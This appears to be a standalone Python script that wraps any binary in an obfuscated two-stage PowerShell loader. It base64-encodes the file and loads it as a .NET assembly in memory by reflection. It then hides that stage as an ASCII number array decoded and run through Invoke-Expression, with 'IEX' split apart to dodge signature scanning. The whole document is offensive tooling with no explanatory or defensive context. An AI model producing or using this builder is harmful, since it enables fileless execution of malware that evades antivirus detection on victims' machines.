import base64
import sys

STAGE_ONE = """$ABCDEFG=@({darray});[System.Text.Encoding]::ASCII.GetString($ABCDEFG)|&('I'+'EX');"""
STAGE_TWO = """IEX([Reflection.Assembly]::Load([Convert]::FromBase64String("{b64payload}")).EntryPoint.Invoke($Null,$Null));"""

def c2ds(input_char):
    # Returns ASCII code of character as string
    return str(ord(input_char))

def build_payload(input_file, output_file):
    
    # Stage two
    data = open(input_file, 'rb').read()
    b64p = base64.b64encode(data).decode('utf-8')
    s2_payload = STAGE_TWO.format(b64payload=b64p)


    # Stage one
    ascii_array =[]
    [ascii_array.append(c2ds(x)) for x in list(s2_payload)]
    str_array = ', '.join(ascii_array)
    s1_payload = STAGE_ONE.format(darray=str_array)

    with open(output_file, 'w') as outfile:
        outfile.write(s1_payload)

def main():
    try:
        build_payload(sys.argv[1], sys.argv[2])

    except Exception as e:
        print(e)

if __name__ == '__main__':
    main()

